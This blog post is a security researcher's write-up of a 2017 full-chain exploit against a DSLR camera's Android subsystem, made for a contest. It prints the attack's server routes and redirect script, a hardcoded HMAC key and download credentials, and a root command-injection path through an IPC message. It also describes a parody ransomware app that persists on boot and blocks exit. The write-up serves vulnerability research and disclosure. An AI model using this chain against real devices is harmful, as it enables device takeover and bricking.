---
layout:	post
title: "Photographers WannCry (2017)"
image: /img/2022-02-10-photographers-wannacry/cry.jpg
---

Back to 2017 I was still doing app pentesting. I came across that my DSLR camera has an Android subsystem and it supports photography apps, therefore I started to investigate if there is a way to pwn it. I did it.

I managed to write a full chain exploit with custom app installation, with local root privilege escalation and persistence on the camera. All the bugs I used were not related to memory safety, though you could probably find tons of N-days on that obsolete system. It was demonstrated on a local Pwn2Own-like contest in China called X-PWN and they were supposed to be submitted to the vendor.

As WannaCry was the hottest infosec trend that year, I made a parody UI that looked like this:

![Owned](/img/2022-02-10-photographers-wannacry/title.jpg)

This picture is for real!

Similarly, CheckPoint has publish their findings on exploiting another DSLR brand to show the iconic WannaCry UI two years later. [Say Cheese: Ransomware-ing a DSLR Camera](https://research.checkpoint.com/2019/say-cheese-ransomware-ing-a-dslr-camera/)

Honestly I didn't track the patch process since I submitted them. It's unclear to me if there were any patches. However there are several reasons that I think it's more like a meme than actual attacks.

* The attack surface I used requires the camera to connect to a rogue WiFi network, which is not a typical scenario for camera users.
* Another potential attack surface, image transfer, requires either physical access (USB) or in the built-in hotspot of the camera. Direct WiFi access uses a randomized password. Once you have physical access, there is nothing you can't do. You might as well just throw it out of the window.
* Computing power on DSLR cameras are low. Maybe someof them are optimized for graphics, but cryptography is different. DSLR nowadays have decent high definition that results in huge file sizes. It's unacceptably slow to do encryption on-device.
* The bugs I am about to write existed in the Android subsystem, which had been removed from new models of the same series after May 2017. No longer avaliable.

I have lost all the source code for this. Luckily I found an old presentation and this blog is totally based on the slides. But I can't guarantee the accuracy.

As we've mentioned before, the attack surfaces for DSLR cameras are all proximity-based. Regardless of the physical access, there are at least three ways:

* Built-in WiFi of the camera
* Camera connects the same WiFi as the attacker
* Bluetooth

Seems like this series of camera wanted to copy the success of the echosystem on smartphones. On the models before May 2017, the users can purchase apps from the official app store and extend the camera's functionality, like Timelapse, Star Trail, Digital Filter, etc. The app store and apps themselves are running on the Android subsystem we've been talking about.

In the write-up from CheckPoint, they used [Magic Lantern](https://magiclantern.fm/) to dump filesystem from a live camera. 

My research started from a decryption tool by some 1337 photographers (nex-hack). A brief visualized structure of the firmware image is shown below:

<p class="full"><img src="/img/2022-02-10-photographers-wannacry/format.svg" alt="Firmware Format"></p>

`FDAT` sections are the encrypted data. Anyway we don't have to worry about the detail. The firmware was easily dumped by the tool. There is even a modified SDK that I can use Android Studio to write a custom app for the camera!

```
firmware.tar_unpacked $ ls
0100_config      0111_backup_sum    0600_gps      0631_ca_sum      0650_prfile      0701_part_image_sum
0101_config_sum  0300_partconf      0601_gps_sum  0640_darwin      0651_prfile_sum  0800_appli
0110_backup      0301_partconf_sum  0630_ca       0641_darwin_sum  0700_part_image  0801_appli_sum
```

All the pre-installed apks are under `./0700_part_image/dev/nflasha16_unpacked_unpacked/app/`. They are in odex format. The magic has been set to `dey\n100\0` (original: `dey\n036\0`), thus some decompliers may throw exception.

The most frequent used app is `SmartRemote.apk`. Its http server is based on Java Servlet. There is also a `libssdpdevice.so` library for SSDP protocol.

Then here comes a browser. The app store `ScalarAMarket.apk` has a WebView. All of the URLs are in https, but I found that it was possible to hijack the page via WiFi portal. The default url is as below:

```
portal_preload_url=http://www.***cameraapps.com/portal/noauth/blank.htm
```

At the time of the contest, the versions of the softwares were:

* WebKit 334.30.0
* Android 4.2.1 (API 16)
* Linux 3.0.27_nl

There were tons of known N-days, but I found something interesting in the apps that can do full chain exploit. Logic bugs rock.

## Remote Code Execution

There was an intent that could be trigger through special MIME:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<activity exported="false" label="@7F040080" name="com.****.scalar.dlsys.scalaramarket.ScalarADownloader" theme="@7F050000">
   <intent-filter>
      <action name="android.intent.action.VIEW" />
      <category name="android.intent.category.BROWSABLE" />
      <category name="android.intent.category.DEFAULT" />
      <data scheme="http" />
      <data scheme="https" />
      <data mimeType="application/x-pmca-wifi-dstartup" />
   </intent-filter>
</activity>
```

This intent is related to app installation. The camera supports directly downloading app within the app store. When the user initiates the download, the app store generates an XPD request to authenticate user account (if you really own the app?) and get the url of the app.

```java
HttpResponseWithLocations httpResponse = this.sendRequest(client, xpdUri, new BasicHeader("Authorization", "Basic " + Base64.encodeToString("nex:mavica".getBytes(), 2)), null);
// ...
if (!new Encryptor("HmacSHA256", ScalarADownloader.this.getDigestCICKey()).toEncryptedString(xpd.get("OUS")).equals(xpd.get("CIC"))) {
    goto cic_check_failed;
}
```

The salt of HMAC is hardcoded in cleartext in JNI:

```c++
int __fastcall Java_com_sony_scalar_dlsys_scalaramarket_ScalarADownloader_getDigestCICKey(JNIEnv *a1)
{
  return a1->NewStringUTF(a1, "8595e68aa5...");
}
```

The server will return the real url for the app and its hash.

```java
private void downloadSpk(ScalarAHttpClient client, Xpd xpd) {
    int v4; byte[] v8;
    long v16;
    long v5;
    FileOutputStream v14;
    FileOutputStream v0;
    InputStream v11;
    HttpEntity v10;
    FileOutputStream v13;
    Uri v18 = Uri.parse(xpd.get("OUS")); // the real APK url
    Log.d("ScalarADownloaderf", "downloadSpk uri=" + v18);
    HttpResponseWithLocations v15 = this.sendRequest(client, v18, this.getDigestAuthContext(
        v18, ScalarADownloader.this.getDigestUserName(), ScalarADownloader.this.getDigestPassword()));
    
    if (ScalarADownloader.this.mDownloadResult == 0) {
        v13 = null;
        ScalarADownloader.this.mDownloadFile = new File(
            ScalarAUtilities.getFilesDir(ScalarADownloader.this), this.getFileNameFromHeader(v15.response, this.getLastPathSegment(v18, v15.locations)));
```

The app has `spk` as the extension. It's an encrypted apk. The magic of first 4 bytes is `1spk`, followed by two DWORDs that are the offset of the encrypted data and the length of the encryption key respectively. This encryption key here is encrypted by RSA (makes no sense of course). The app can be decrypted with this AES key.

## Exploit

1. Set up a hotspot and hijack DNS. Redirect `www.***cameraapps.com` to our webserver.
2. Redirect to `/xpd` in the Wifi portal (`/portal/noauth/blank.htm`).
3. Serve malicious SPK and its CIC checksum under `/xpd`.
4. We can install arbitrary APK as soon as the camera connects to the hotspot.
5. Final trick: export another intent in our WannaCry app so it can be launched by the web.

The frontend code of the exploit:

```js
setTimeout(function() {
  location.href = '/xpd';
  setTimeout(function() {
    location.href = '/launch' // launch WannaCry after installation
  }, 1000 * 20)
}, 1000 * 3)
```

As you can notice, there was also a bug that allows multiple redirect within one page. Here's also the server code:

```js
router.get('/xpd', async (ctx, next) => {
  ctx.type = 'application/x-pmca-wifi-dstartup'
  ctx.body = await readFile('xpd') // call the intent to install app
}).get('/payload', async (ctx, next) => {
  ctx.attachment('app.1.spk')
  await send(ctx, 'app.spk') // WannaCry payload
}).get('/exploit', async (ctx, next) => {
  await send(ctx, 'index.html')
}).get('/portal/noauth/blank.htm', async (ctx, next) => {
  ctx.redirect('/exploit') // the first landing page must be a server-side redirect, otherwise the Wifi portal would think that it's successfully connected
}).get('/launch', async (ctx, next) => {
  ctx.type = 'application/cry'
  ctx.body = ''
})
```

## WannaCry

The app can access all user media through Content Provider, just like regular Android. Or you can simply read and write the filesystem.

For persistence, there is a broadcast on each boot: `com.android.server.DAConnectionManagerService.BootCompleted`. A listener is enough to launch the app everytime the camera turns on.

If you override `onKeyDown` event of the Activity to capture it, there would be no way to exit the app. The power button is not enough to turn off the camera. You need to take out the battery to shutdown.

At this point, I've got a shell within the app and the app will be back on next boot. But there is still a problem that the shell is not superuser yet.

```
$ id
uid=2000(shell) gid=2000(shell) 
groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sd
card_rw),3001(net_bt_admin),3002(net_bt),3003(inet)
```

I found a library called `libosal_uipc.so`. I assume the name is Universal IPC. It provides several api as follow:

* `osal_snd_sync_msg`
* `osal_reg_msg_queue_cb`
* `osal_snd_msg`
* `osal_set_msg_pri`
* `osal_get_msg_pri`
* `osal_stat_msgq`
* `osal_set_msgq_broadcast_mode`
* `osal_set_msgq_log_mode`
* `osal_set_msgq_rt_mode`
* `osal_get_uipc_stat`

It's an IPC mechanism that allows the app to communicate with system services. It's implemented in the kernel module `osal_uipc.ko`, who serves the device `/dev/uipc`.

Sample usage:

Sender:

```cpp
char *msg;
const int message_id = 0x123;
errno = osal_valloc_msg_wait(message_id, (void **) &msg, 256, 1);
if (errno) return errno;
// initialize the message
errno = osal_snd_msg(message_id, msg);
```

Listener:

```cpp
const int message_id = 0x123;
void *msg;
while (running) {
  if (osal_rcv_msg_tmo(message_id, &msg, -1)) {
    sleep(1u);
  } else {
    // do something
    osal_free_msg(message_id, msg_pack);
  }
}
```

There is a process `bootin.elf` that has root privilege. It monitors `0x94020A` message queue. 

```cpp
while (state != 3) {
  if (osal_rcv_msg_tmo(0x94020A, (int)&msg, -1)) {
    sleep(1u);
  } else {
    if (dispatch_cmd(msg)) sleep(1u);
    osal_free_msg(0x94020A, msg);    
  }
}
```

When the message has magic number `0x940005` and the payload starts with `im.elf`, the command will be executed via `system`, thus we can inject arbitrary shell command in the string.

```cpp

if ( *(_DWORD *)a1 == 0x940005 ) {
  if ( strncmp((const char *)a1 + 4, "im.elf", 6u) )
  {
    memset(v7, 0, sizeof(v7));
    strncpy(v7, v5, 0x100u);
    sub_8E8C(2, v7);
    v2 = v7;
    system(v2);
    return 0;
  }
```

With root access, it's possible to mess with the filesystem and break firmware updater, then the camera could become a total brick. Quite scary.

## Conclusion

This attact scenario requires manually connecting to a rogue hotspot (not the one for direct photo transfer), so it's not very likely to happen in real life. It's funny to do the parody and show a possible vector for ransomware. I still think the ransomware on camera is non-trivial due to the lack of computing power. Maybe you can prove me wrong. Sometimes I posted something that I think has no serious impact but turned out to be exploitable. Who knows.

Those affected models were released like more than 5 years ago. The system no longer exists on recent models. However some other vedors keep releasing new cameras that has Android and even with Lightroom preinstalled. Could be your next research target if you like.
